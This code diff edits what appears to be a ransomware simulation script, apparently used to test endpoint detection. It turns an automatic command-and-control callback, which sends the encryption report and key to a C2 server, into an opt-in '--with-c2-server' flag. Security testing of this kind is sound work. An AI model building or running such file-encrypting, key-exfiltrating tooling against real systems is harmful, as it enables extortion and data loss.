@@ -140,7 +140,7 @@ def run_seed(force: bool = False) -> None:
 # ---------------------------------------------------------------------------
 # Encrypt phase
 # ---------------------------------------------------------------------------
-def run_encrypt() -> None:
+def run_encrypt(c2_callback_fn) -> None:
     logger.info("=== ENCRYPT PHASE ===")
 
     if not validate_environment(config, logger):
@@ -168,7 +168,8 @@ def run_encrypt() -> None:
 
     _save_session(key, enc_results)
     report = collector.finalize()
-    run_c2_callback(report, key)
+    if c2_callback_fn is not None:
+        c2_callback_fn(report, key)
     collector.export_json(report, config.REPORT_FILE)
     logger.info(
         "Encrypt phase done: %d/%d files. Report → '%s'",
@@ -432,6 +433,11 @@ def main() -> None:
         default=0,
         help="[--add-edr] files encrypted before EDR fired",
     )
+    parser.add_argument(
+        "--with-c2-server",
+        action="store_true",
+        help="Enable C2 callback url - Send data to C2 server",
+    )
     args = parser.parse_args()
 
     if args.seed:
@@ -446,7 +452,11 @@ def main() -> None:
     elif args.decrypt:
         run_decrypt()
     else:
-        run_encrypt()
+        if args.with_c2_server:
+            logger.info("C2 server enabled")
+            run_encrypt(c2_callback_fn=run_c2_callback)
+        else:
+            run_encrypt(None)
 
 
 if __name__ == "__main__":
